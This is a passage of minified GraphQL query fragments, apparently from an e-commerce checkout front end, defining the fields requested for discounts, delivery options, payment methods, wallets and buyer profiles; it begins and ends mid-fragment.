FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment FinalizedRemoteCheckoutsResult on FinalizedRemoteCheckout{shopId result{...on ProcessedRemoteReceipt{orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{deliveryStrategy{handle title __typename}lineAmount{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on FailedRemoteReceipt{recoveryUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}...on CartMetafieldDeleteOperation{key namespace appId __typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}remote{consolidated{totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms deliveryPredictionEligible brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment ParentMerchandiseLine on MerchandiseLine{stableId lineAllocations{stableId __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}__typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}shopCashBalance{...on UnavailableTerms{__typename _singleInstance}...on FilledShopCashBalance{availableBalance{amount currencyCode __typename}__typename}...on PendingTerms{taskId pollDelay __typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress canUpdateDiscountCodes delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle crossBorder deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}displayIncentive}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on BankPaymentMethod{displayName orderingIndex paymentMethodIdentifier paymentProviderClientCredentials{apiClientKey merchantAccountId __typename}availableInstruments{bankName lastDigits shopifyPublicToken __typename}__typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{shopUser{publicId metafields{key namespace value type valueType __typename}__typename}customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired remote{...RemoteDetails __typename}__typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}metafieldRequests{namespace key __typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId payerApprovedAmount{amount currencyCode __typename}__typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion 